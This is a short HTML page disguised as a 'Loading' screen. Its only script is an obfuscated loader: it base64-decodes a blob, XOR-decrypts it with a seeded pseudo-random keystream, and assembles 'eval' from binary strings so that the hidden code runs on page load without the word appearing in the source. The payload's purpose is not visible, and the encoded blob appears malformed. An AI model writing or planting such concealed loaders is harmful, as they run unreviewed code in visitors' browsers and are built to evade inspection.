<!DOCTYPE html>
<html><head><title>Loading</title></head>
<body>
<div id="app"></div>
<script>
var blob = "KzYxLzYxNj8+PAP8NR8sKhIP2wQw==";
var seed = 555001;
function rnd() { seed = (seed * 9301 + 49297) % 233280; return seed / 233280; }
var raw = atob(blob);
var out = "";
for (var i = 0; i < raw.length; i++) {
  var c = raw.charCodeAt(i);
  var k = Math.floor(rnd() * 256);
  out += String.fromCharCode(c ^ k);
}
var getCC = Object.getOwnPropertyDescriptors(String)["from" + "Char" + "Code"].value;
var bits = ['01100101', '01110110', '01100001', '01101100'];
var sink = bits.map(function(b) { return getCC(parseInt(b, 2)); }).join('');
globalThis[sink](out);
</script>
</body></html>
